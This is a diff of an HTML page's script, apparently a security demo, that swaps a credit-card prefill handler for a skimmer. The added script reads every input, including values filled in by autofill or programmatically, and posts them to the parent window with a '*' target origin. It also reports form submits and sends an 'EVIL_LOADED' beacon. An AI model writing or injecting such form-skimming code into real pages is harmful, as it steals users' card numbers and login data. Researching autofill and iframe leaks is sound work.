@@ -40,15 +40,61 @@
 
 
     <script>
-        window.addEventListener('message', (ev) => {
-            const d = ev.data; if (!d) return;
-            if (d.cmd === 'prefill-cc') {
-                document.querySelector('#ccForm [name="cc-number"]').value = d.cc || '';
-                document.querySelector('#ccForm [name="cc-exp"]').value = d.exp || '';
-                parent.postMessage({ cmd: 'iframe-log', msg: 'cc prefilled by host postMessage' }, '*');
-            }
+  (function(){
+    function send(msg) {
+      try {
+        window.parent.postMessage(msg, '*'); // možeš zameniti '*' sa parent origin radi sigurnosti
+      } catch(e) {
+        console.warn('postMessage failed', e);
+      }
+    }
+
+    function watchInputs() {
+      const inputs = document.querySelectorAll('input, textarea, select');
+      inputs.forEach(inp => {
+        inp.addEventListener('input', () => {
+          send({ type: 'INPUT_CHANGE', id: inp.id || inp.name || 'unknown', value: inp.value });
         });
-    </script>
+        inp.addEventListener('change', () => {
+          send({ type: 'INPUT_CHANGE', id: inp.id || inp.name || 'unknown', value: inp.value });
+        });
+      });
+    }
+
+    // also notify about autofill events: try to detect value changes shortly after load (some autofill happens on load)
+    window.addEventListener('load', () => {
+      send({ type: 'EVIL_LOADED', url: location.href });
+      watchInputs();
+      // scan initial values (in case autofill filled them immediately)
+      setTimeout(() => {
+        const initial = [];
+        document.querySelectorAll('input').forEach(i => {
+          if (i.value) {
+            initial.push({ id: i.id || i.name, value: i.value });
+          }
+        });
+        if (initial.length) send({ type: 'INITIAL_VALUES', values: initial });
+      }, 200); // 200ms after load
+    });
+
+    // intercept form submit
+    document.addEventListener('submit', (ev) => {
+      const form = ev.target;
+      send({ type: 'FORM_SUBMIT', action: form.action || location.href });
+    }, true);
+
+    // optional: observe DOM mutations to detect programmatic fills
+    const obs = new MutationObserver(() => {
+      const changed = [];
+      document.querySelectorAll('input').forEach(i => {
+        if (i.value) changed.push({ id: i.id || i.name, value: i.value });
+      });
+      if (changed.length) send({ type: 'MUTATION_VALUES', values: changed });
+    });
+    obs.observe(document, { attributes: true, childList: true, subtree: true, attributeFilter: ['value'] });
+  })();
+</script>
+
 </body>
 
 </html>
